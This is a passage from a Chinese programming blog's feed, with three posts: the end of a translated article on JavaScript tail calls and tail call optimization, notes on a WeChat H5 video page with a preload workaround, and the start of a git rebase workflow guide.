&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，现在这个函数要做的最后一件事就是返回调用自身的结果，这就是尾调用。</p><p>大家可能注意到了，这次我们给函数传递了两个参数：一个是我们想要计算下一个阶乘的数值（<code>n - 1</code>），一个是累积的总数，即 <code>n * total</code>。</p><p>现在，我们不一定需要（像前面例子中那样）先取得派生调用的叶节点了。因为我们有了求解当前问题所需的所有值（累积的值，以及下一次应该计算的阶乘）。</p><p>我们来分析一下，为什么这个函数可以在不依赖多次递归调用的情况下完成计算。</p><p>以下是调用 <code>factorial(4)</code> 的过程。</p><ol><li>在栈顶部压入一个对 <code>factorial</code> 的调用。</li><li>因为 <code>4</code> 不是 <code>0</code>（既定情况），那么我们知道下一次要计算的值（<code>3</code>）和当前累积值（<code>4 * total</code>）。</li><li>再次调用 <code>factorial</code>，它会得到完成计算所需的所有数据：要计算的下一个阶乘和累积的总数。至此，不再需要之前的栈帧了，可以把它弹出，只添加新的调用 <code>factorial(3, 4)</code>。</li><li>这次调用同样大于 <code>0</code>，于是需要计算下一个数的阶乘，同时将累积值（<code>4</code>）与当前值（<code>3</code>）相乘。</li><li>至此（又）不再需要上一次调用了，可以把它弹出，再次调用 <code>factorial</code>并传入 <code>2</code> 和 <code>12</code>。再次更新累积值为 <code>24</code>，同时计算 <code>1</code> 的阶乘。</li><li>前一帧又从栈中被删除，我们又用 <code>1</code> 乘以<code>24</code>（总数），并计算 <code>0</code> 的阶乘。</li><li>最后，<code>0</code> 的阶乘返回了累积的总数，也就是 <code>24</code>（就是 <code>4</code> 的阶乘）。</li></ol><p>简单说吧，这就是整个过程：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">factorial(<span class="number">4</span>, <span class="number">1</span>) <span class="comment">// 1 is the default value when nothing gets passed</span></span><br><span class="line">factorial(<span class="number">3</span>, <span class="number">4</span>) <span class="comment">// This call does not need the previous one, it has all the data it needs</span></span><br><span class="line">factorial(<span class="number">2</span>, <span class="number">12</span>) <span class="comment">// This call does not need the previous one, it has all the data it needs</span></span><br><span class="line">factorial(<span class="number">1</span>, <span class="number">24</span>) <span class="comment">// This call does not need the previous one, it has all the data it needs</span></span><br><span class="line">factorial(<span class="number">0</span>, <span class="number">24</span>) <span class="comment">// -&amp;gt; Returns the total (24) and also does not need the previous one</span></span><br></pre></td></tr></table></figure><p>现在，不需要在栈中保留 <code>n</code> 个帧，而只要保留 <code>1</code> 个即可。因为后续调用并不依赖之前的调用。结果就是新 <code>factorial</code> 函数的内存复杂变由 <code>O(N)</code> 变成了 <code>O(1)</code>。</p><h3 id="在Node中使用适当的尾调用"><a href="#在Node中使用适当的尾调用" class="headerlink" title="在Node中使用适当的尾调用"></a>在Node中使用适当的尾调用</h3><p>给上面的函数添加一行 <code>console.trace</code> 调用，并且调用 <code>factorial(3)</code> 以便看到栈中的调用情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.trace()</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> total</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>你会发现，虽然这个函数已经是尾递归的了，但栈中仍然保存了多次对 <code>factorial</code> 函数的调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// ...</span><br><span class="line">// These are the last two calls to the `factorial` function</span><br><span class="line">Trace</span><br><span class="line">    at factorial (repl:2:9) // Here we have 3 calls stacked</span><br><span class="line">    at factorial (repl:7:8)</span><br><span class="line">    at factorial (repl:7:8)</span><br><span class="line">    at repl:1:1 // Implementation details below this line</span><br><span class="line">    at realRunInThisContextScript (vm.js:22:35)</span><br><span class="line">    at sigintHandlersWrap (vm.js:98:12)</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:24:12)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:313:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br><span class="line">    at REPLServer.runBound [as eval] (domain.js:293:12)</span><br><span class="line">Trace</span><br><span class="line">    at factorial (repl:2:9) // The last call added one more frame to our stack</span><br><span class="line">    at factorial (repl:7:8)</span><br><span class="line">    at factorial (repl:7:8)</span><br><span class="line">    at factorial (repl:7:8)</span><br><span class="line">    at repl:1:1 // Implementation details below this line</span><br><span class="line">    at realRunInThisContextScript (vm.js:22:35)</span><br><span class="line">    at sigintHandlersWrap (vm.js:98:12)</span><br><span class="line">    at ContextifyScript.Script.runInThisContext (vm.js:24:12)</span><br><span class="line">    at REPLServer.defaultEval (repl.js:313:29)</span><br><span class="line">    at bound (domain.js:280:14)</span><br></pre></td></tr></table></figure><p>为了在Node中使用适当的尾调用，必须在JS文件顶部添加 <code>&#39;use strict&#39;</code> 以启用 <code>strict mode</code>，然后以 <code>--harmony_tailcalls</code> 标记来运行。</p><p>为了让以上标记能改进 <code>factorial</code> 函数，我们的脚本应该是这样的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.trace()</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> total</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>下面这样运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> node --harmony_tailcalls factorial.js`</span><br></pre></td></tr></table></figure><p>再次运行后，得到如下栈跟踪信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Trace</span><br><span class="line">    at factorial (/Users/lucasfcosta/factorial.js:4:13)</span><br><span class="line">    at Object.&amp;lt;anonymous&amp;gt; (/Users/lucasfcosta/factorial.js:12:1)</span><br><span class="line">    at Module._compile (module.js:571:32)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:488:32)</span><br><span class="line">    at tryModuleLoad (module.js:447:12)</span><br><span class="line">    at Function.Module._load (module.js:439:3)</span><br><span class="line">    at Module.runMain (module.js:605:10)</span><br><span class="line">    at run (bootstrap_node.js:420:7)</span><br><span class="line">    at startup (bootstrap_node.js:139:9)</span><br><span class="line">Trace</span><br><span class="line">    at factorial (/Users/lucasfcosta/factorial.js:4:13)</span><br><span class="line">    at Object.&amp;lt;anonymous&amp;gt; (/Users/lucasfcosta/factorial.js:12:1)</span><br><span class="line">    at Module._compile (module.js:571:32)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:488:32)</span><br><span class="line">    at tryModuleLoad (module.js:447:12)</span><br><span class="line">    at Function.Module._load (module.js:439:3)</span><br><span class="line">    at Module.runMain (module.js:605:10)</span><br><span class="line">    at run (bootstrap_node.js:420:7)</span><br><span class="line">    at startup (bootstrap_node.js:139:9)</span><br><span class="line">Trace</span><br><span class="line">    at factorial (/Users/lucasfcosta/factorial.js:4:13)</span><br><span class="line">    at Object.&amp;lt;anonymous&amp;gt; (/Users/lucasfcosta/factorial.js:12:1)</span><br><span class="line">    at Module._compile (module.js:571:32)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:488:32)</span><br><span class="line">    at tryModuleLoad (module.js:447:12)</span><br><span class="line">    at Function.Module._load (module.js:439:3)</span><br><span class="line">    at Module.runMain (module.js:605:10)</span><br><span class="line">    at run (bootstrap_node.js:420:7)</span><br><span class="line">    at startup (bootstrap_node.js:139:9)</span><br><span class="line">Trace</span><br><span class="line">    at factorial (/Users/lucasfcosta/factorial.js:4:13)</span><br><span class="line">    at Object.&amp;lt;anonymous&amp;gt; (/Users/lucasfcosta/factorial.js:12:1)</span><br><span class="line">    at Module._compile (module.js:571:32)</span><br><span class="line">    at Object.Module._extensions..js (module.js:580:10)</span><br><span class="line">    at Module.load (module.js:488:32)</span><br><span class="line">    at tryModuleLoad (module.js:447:12)</span><br><span class="line">    at Function.Module._load (module.js:439:3)</span><br><span class="line">    at Module.runMain (module.js:605:10)</span><br><span class="line">    at run (bootstrap_node.js:420:7)</span><br><span class="line">    at startup (bootstrap_node.js:139:9)</span><br></pre></td></tr></table></figure><p>如你所见，每次栈中保存的对factorial的调用只有一个了。因为每次调用这个函数后，之前的调用帧就没用了。</p><p>因此说到如何创建尾调用函数，关键就在于传递下一次调用所需的全部“状态”，这样才能达到删除下一帧的目的。有时候在一个函数里可能无法做到这一点，此时可以考虑利用嵌套函数实现尾递归。</p><p>要记住，<strong>适当的尾调用不一定会让代码跑得更快</strong>。实际上，多数情况下，有了它<a href="https://github.com/tc39/proposal-ptc-syntax#performance" target="_blank" rel="noopener">反而会更慢</a>。</p><p>然而，使用适当的尾调用除了可以节省调用栈的内存占用，还会由于在局部声明的对象使运行递归函数占用的内存更少。由于下一次递归调用不必使用当前帧中的任何变量，因此垃圾收集器就可以把当前帧中的所有对象销毁了。但在“非尾递归”函数中，每调用一次递归函数，都要分配一次内存。毕竟所有帧在最后一次递归调用（即返回“既定情况”的调用）返回前，都必须保存在帧里。</p><h3 id="尾调用优化（TCO）"><a href="#尾调用优化（TCO）" class="headerlink" title="尾调用优化（TCO）"></a>尾调用优化（TCO）</h3><p>与适当的尾调用不同，尾调用优化的目的则是提升尾递归函数的性能，让它们跑得更快。</p><p>尾调用优化是编译器使用的一种技术，它使用 <code>jumps</code> 把递归调用转换成一个循环。</p><p>我们已经知道了尾递归函数的执行过程，那么在此基础上解释尾调用优化也就简单了。</p><p>仍然以前面的 <code>factorial</code> 函数为例，我们来看看假如我们的JavaScript引擎启用了尾调用优化会怎么样。</p><p>以下是起始代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> total</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然以上代码在退出条件（“既定情况”）满足前会重复执行，那我们何不把重复的代码装到一个标签里，直接来回跳转，从而避免重复调用自己呢？好，实现以上想法的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    LABEL:</span><br><span class="line">        <span class="keyword">if</span> (n === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> total</span><br><span class="line">        &#125;</span><br><span class="line">        total = n * total</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">        goto LABEL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这说明<strong>尾调用优化</strong>与实现<strong>适当的尾调用</strong>不是一回事！</p><h3 id="实现适当的尾调用及尾调用优化的缺点"><a href="#实现适当的尾调用及尾调用优化的缺点" class="headerlink" title="实现适当的尾调用及尾调用优化的缺点"></a>实现适当的尾调用及尾调用优化的缺点</h3><p>在前面的例子中我们看到，适当的尾调用意味着不会在栈里“保存”调用函数的历史。结果查看栈追踪信息就很难定位到问题，因为它并不包含所有调用信息，怎么知道是哪次调用导致出错？</p><p><a href="http://lucasfcosta.com/2017/02/17/JavaScript-Errors-and-Stack-Traces.html" target="_blank" rel="noopener">前面提到的文章</a>中涉及的 <code>console.trace</code> 语句和 <code>Error.stack</code> 属性都会因此受影响。</p><p>对此，可以通过在开发环境中使用“影子栈”（Shadow Stack）来解决。</p><p>影子栈就是“备份栈”。虽然正常的栈在适当的尾调用下不会保存所有帧，但所有调用都可推入这个“影子栈”，以便利用它进行调试，同时还不会污染执行栈。</p><p>然而，可以想见，目前这方面还没有可靠易用的工具。而且，这样一来又要在另一个地方占用更多内存以保存所有帧（开发环境下应该不是问题）。</p><p>还有，对于实现尾调用优化的代码，影子栈也解决不了 <code>Error.stack</code> 属性的问题。因为此时将使用 <code>goto</code> 语句，不会再向栈追踪信息中添加任何帧信息。这意味着假如有错误对象被创建，那么产生这个错误的函数可能并不在栈里。因为我们是直接在函数内跳转，而不是像递归那样重复调用函数。</p><p>如果你好奇，可以看看<a href="https://webkit.org/blog/6240/ecmascript-6-proper-tail-calls-in-webkit/" target="_blank" rel="noopener">Michael Saboff这篇雄文</a>里关于WebKit如何处理尾调用的介绍。</p><h2 id="语法级尾调用（STC）"><a href="#语法级尾调用（STC）" class="headerlink" title="语法级尾调用（STC）"></a>语法级尾调用（STC）</h2><p>语法级尾调用是一种告诉编译器什么时候需要适当的尾调用，什么时候需要尾调用优化的方式</p><p>这样，就可以让开发者选择是否使用这个特性。基本上可以说就是尊重个人的选择。</p><p>开发者由此可以自己控制栈帧的复杂性，从而也允许“不那么带攻击性的”（或者不做优化的）方案存在。（正像<a href="https://github.com/tc39/proposal-ptc-syntax#proposal" target="_blank" rel="noopener">建议本身</a>自己说的那样。）</p><p>说到语法，有几种备选方案，可以<a href="https://github.com/tc39/proposal-ptc-syntax#syntax-alternatives" target="_blank" rel="noopener">参考这里。</a></p><p>目前这还是一个<a href="https://github.com/tc39/proposals/blob/master/stage-0-proposals.md" target="_blank" rel="noopener">第0阶段的提议。</a></p><h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><ul><li>V8 Team blog post which also talks about tail calls - <a href="https://v8project.blogspot.com.br/2016/04/es6-es7-and-beyond.html" target="_blank" rel="noopener">https://v8project.blogspot.com.br/2016/04/es6-es7-and-beyond.html</a></li><li>Checking whether a function is in a tail position by Dr. Axel Rauschmayer - <a href="http://2ality.com/2015/06/tail-call-optimization.html#checking_whether_a_function_call_is_in_a_tail_position" target="_blank" rel="noopener">http://2ality.com/2015/06/tail-call-optimization.html#checking_whether_a_function_call_is_in_a_tail_position</a></li><li>ECMAScript 6 Proper Tail Calls in WebKit by Michael Saboff - <a href="https://webkit.org/blog/6240/ecmascript-6-proper-tail-calls-in-webkit/" target="_blank" rel="noopener">https://webkit.org/blog/6240/ecmascript-6-proper-tail-calls-in-webkit/</a></li><li>The Syntactic Tail Calls Proposal by Brian Terlson - <a href="https://github.com/tc39/proposal-ptc-syntax#syntactic-tail-calls-stc" target="_blank" rel="noopener">https://github.com/tc39/proposal-ptc-syntax#syntactic-tail-calls-stc</a></li><li>Issue about Tail call Optimization (TCO) in ES6 &amp; Node.js by Mr. Rod Vagg</li><li>ES6 tail calls controversy issue by Juriy Zaytsev - <a href="https://github.com/kangax/compat-table/issues/819" target="_blank" rel="noopener">https://github.com/kangax/compat-table/issues/819</a></li></ul><h3 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h3><p>如果您有任何疑问、想法或者您不同意我写的任何内容，请在下面的评论中与我分享，或通过Twitter上的<a href="https://twitter.com/lfernandescosta" target="_blank" rel="noopener">@lfernandescosta</a>与我联系。我很乐意听到你要说的话。</p><p>谢谢阅读！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本文转载自：&lt;a href=&quot;http://www.zcfy.cc&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;众成翻译&lt;/a&gt;&lt;br&gt;译者：&lt;a href=&quot;http://www.zcfy.cc/@cncuckoo&quot; targ
      
    
    </summary>
    
      <category term="文章转发" scheme="http://blog.minfive.com/categories/%E6%96%87%E7%AB%A0%E8%BD%AC%E5%8F%91/"/>
    
    
      <category term="转发" scheme="http://blog.minfive.com/tags/%E8%BD%AC%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>微信视频 H5 开发小结</title>
    <link href="http://blog.minfive.com/2017/12/11/2017-12-11-wechat-video/"/>
    <id>http://blog.minfive.com/2017/12/11/2017-12-11-wechat-video/</id>
    <published>2017-12-10T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近日，由于工作原因，需要开发一款视频类 h5。玩法很简单，用户滚页面至底部，切换全屏视频播放。<br>地址如下：</p><p><img src="http://blog.static.minfive.com/post/17-12-11/0c05c64de7df694e1b4fa5ea99f3ddb8.png" alt="10-08"></p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="全屏同层播放"><a href="#全屏同层播放" class="headerlink" title="全屏同层播放"></a>全屏同层播放</h4><p>为了满足交互需求，需要达到全屏同层播放，具体配置如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">"my-video"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">type</span>=<span class="string">"video/mp4"</span> <span class="attr">x5-video-player-fullscreen</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">webkit-playsinline</span></span></span><br><span class="line"><span class="tag">    <span class="attr">playsinline</span></span></span><br><span class="line"><span class="tag">    <span class="attr">x-webkit-airplay</span>=<span class="string">"allow"</span> <span class="attr">x5-video-player-type</span>=<span class="string">"h5"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">"www.baidu.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="视频预加载"><a href="#视频预加载" class="headerlink" title="视频预加载"></a>视频预加载</h4><p>由于该 H5 为视频类 H5 ，在移动端播放视频还是要考虑到加载速度及稳定播放等问题，因此笔者采用的是 “边播边加载” 的方式，利用 video 标签的 <code>canplaythrough</code> 事件作为页面加载完成的标志。</p><p>由于移动端原因， video 并不会主动去预加载用户未需求的资源，因此我们需要手动去触发 video 的预加载资源，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'my-video'</span>).play();</span><br></pre></td></tr></table></figure><p>这样就可以了吗？</p><p>不，万恶的微信限制了必须用户行为才能播放媒体资源，因此我们只能再祭出万能 hack：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">document.addEventListener(&apos;DOMContentLoaded&apos;, function() &#123;</span><br><span class="line">    let video = document.getElementById(&apos;my-video&apos;);</span><br><span class="line"></span><br><span class="line">    function preload() &#123;</span><br><span class="line">        video.play();</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            video.pause();</span><br><span class="line">        &#125;, 200);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    document.addEventListener(&quot;WeixinJSBridgeReady&quot;,  preload, false);</span><br><span class="line">    if (typeof WeixinJSBridge == &quot;object&quot; &amp;&amp; typeof WeixinJSBridge.invoke == &quot;function&quot;) &#123;</span><br><span class="line">        WeixinJSBridge.invoke(&quot;getNetworkType&quot;, &#123;&#125;, preload);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    preload(); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="槽点"><a href="#槽点" class="headerlink" title="槽点"></a>槽点</h3><h4 id="布局限制"><a href="#布局限制" class="headerlink" title="布局限制"></a>布局限制</h4><p>安卓端由于无法像 ios 端完美的实现全屏播放，播放视频时手机依旧会进入媒体播放模式，这就导致了播放视频时会连带着媒体播放层的弹出，而媒体播放层则类似于 <code>position: fixed; top: 0; left: 0;</code> 的效果固定在页面顶部，每个媒体<br>播放层的弹出，都会预先将页面滚动至顶部，如果页面发生滚动，在安卓端播放视频就会出现短暂的黑屏。</p><p><strong>因此，微信视频类 H5 如果需要滚动存在，请采用局部滚动。</strong></p><h4 id="用户行为限制"><a href="#用户行为限制" class="headerlink" title="用户行为限制"></a>用户行为限制</h4><p>安卓端下，滚动行为不归属在用户操作行为中，滚动事件中无法执行视频播放，在这个问题上，笔者使用 <code>touchstart</code> 对安卓端进行 hack。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul><li><a href="http://www.cnblogs.com/baiyygynui/p/6323565.html" target="_blank" rel="noopener">video 标签在微信浏览器的问题解决方法</a></li><li><a href="https://www.zhihu.com/question/36423771" target="_blank" rel="noopener">微信内置浏览器 如何小窗不全屏播放视频？</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;近日，由于工作原因，需要开发一款视频类 h5。玩法很简单，用户滚页面至底部，切换全屏视频播放。&lt;br&gt;地址如下：&lt;/p&gt;
&lt;p&gt;&lt;img s
      
    
    </summary>
    
      <category term="经验总结" scheme="http://blog.minfive.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="wechat" scheme="http://blog.minfive.com/tags/wechat/"/>
    
  </entry>
  
  <entry>
    <title>使用 Git Rebase 美化 Git Commit 流程</title>
    <link href="http://blog.minfive.com/2017/10/06/2017-10-06-git-rebase/"/>
    <id>http://blog.minfive.com/2017/10/06/2017-10-06-git-rebase/</id>
    <published>2017-10-05T16:00:00.000Z</published>
    <updated>2019-03-31T13:22:59.152Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>上篇文章讲到 <a href="/2017/09/08/2017-09-08-git-commit-message/">commit message 规范</a>，git 版本控制在日常团队协作中有着极其重要的作用，除了对 git 的 commit 信息进行规范化管理之外，还可以对 git 的 commit 做一些补丁修饰，即 git rebase。</p><h3 id="什么是-git-rebase"><a href="#什么是-git-rebase" class="headerlink" title="什么是 git rebase"></a>什么是 git rebase</h3><p>在 git 中对于不同分支间的修改有两种方式：<code>merge</code> 和 <code>rebase</code>，merge 这个比较常用，用于合并分支，同样的，rebase 也可用于合并分支，虽然较少使用，但功能却比简单的 merge 强大的多。</p><p>rebase 即变基，顾名思义，就是改变基准点，以 commit 为基准点可以随意修改 commit 历史，以分支为基准点可以合并分支，同时整理 commit。</p><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>上文讲到 rebase 可以以 commit 为基准点也可以以分支为基准点，那么以笔者为例，rebase 的主要用法如下：</p><ul><li>修改 commit 历史，结合上一篇文章讲的 <a href="/2017/09/08/2017-09-08-git-commit-message/">commit message 规范</a>，可以做到每一个 commit 仅切只做一件事情，单一原则。</li><li>合并分支，使分支保持单一链式，避免频繁的切换分支指向，导致分支 commit 混乱。(强迫症必备良药)</li></ul><h4 id="commit-的修改"><a href="#commit-的修改" class="headerlink" title="commit 的修改"></a>commit 的修改</h4><p>对于 commit 的修改可以使用 <code>git commit -amend</code> 修改下 commit 信息，如果要修改多个 commit，那么就要使用 <code>git rebase</code> 了。</p><p>简单流程如下：</p><p>使用 <code>git log --oneline</code> 获取相应 commit 的哈希值（该 commit 为基准点，不参与本次修改）;</p><p><img src="http://blog.static.minfive.com/post/17-10-06/git-log-oneline.png" alt="git-log"></p><p>使用 <code>git rebase -i 5663aa4(指定的基准点)</code> 进入 vi 模式手动编辑选定区间内的 commit，可合并可编辑可删除，具体操作请参照 vi 界面的注释内容。</p><p><img src="http://blog.static.minfive.com/post/17-10-06/git-rebase-commit.png" alt="git-rebase-commit"></p><p>结合 <a href="/2017/09/08/2017-09-08-git-commit-message/">commit message 规范</a> 就可以实现完美的单一任务原则 commit，在正式完成某个任务之后，可以通过 rebase 将无意义的 commit 合并在一起。</p><h4 id="分支的合并"><a href="#分支的合并" class="headerlink" title="分支的合并"></a>分支的合并</h4><p>分支的合并有两种方式：<code>merge</code> 和 <code>rebase</code>，两种方式的具体区别大家可以参考 <a href="https://git-scm.com/book/zh/v2/Git-%E5%88%86%E6%94%AF-%E5%8F%98%E5%9F%BA" target="_blank" rel="noopener">Pro Git Book</a> 的解释。</p><p>简单来说：</p><p>对于相同情况下的 git 分叉：</p><p><img src="http://blog.static.minfive.com/post/17-10-06/basic-rebase-1.png" alt="git-rebase-1"></p><p>merge 的合并如下图：</p><p><img src="http://blog.static.minfive.com/post/17-10-06/basic-rebase-2.png" alt="git-rebase-2"></p><p>rebase 的合并如下图：</p><p><img src="http://blog.static.minfive.com/post/17-10-06/basic-rebase-4.png" alt="git-rebase-3"></p><p>两者的区别在于 merge 只是简单的把所有改动整合到一个 commit 中，并保留 commit 纪录，还会产生恶心人的非必要合并 commit，而 rebase 则会根据最近的共同祖先作为基准点将改动依次进行排序，当前分支的改动永远置于最后，且不会产生合并 commit。</p><h3 id="双刃剑"><a href="#双刃剑" class="headerlink" title="双刃剑"></a>双刃剑</h3><p>在日常团队协作开发一般都推荐 git flow 的工作流程，禁止使用 rebase 来合并分支，主要的原因在于 rebase 会改变整个分支的 commit 流向，极其容易产生版本冲突，所以，对于 rebase 的使用，笔者有几个小小的建议：</p><ul><li>使用 rebase 修改 commit 只在本地分支发生</li><li>本地分支 push 到服务器仓库上前都应该先 <code>git rebase origin (branch)</code> 保证拉取最新代码。 </li><li>禁止使用 <code>git push --force</code> 覆盖服务器上的提交历史。</li></ul><p>总而言之，rebase 是一个很强大的工具，只要操作得当，绝对是一大杀器。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综上，笔者总结来一套用来结合 <a href="/2017/09/08/2017-09-08-git-commit-message/">commit message 规范</a> 和 <code>git rebase</code> 的工作流程，具体如下：</p><p>假设团队开发项目除 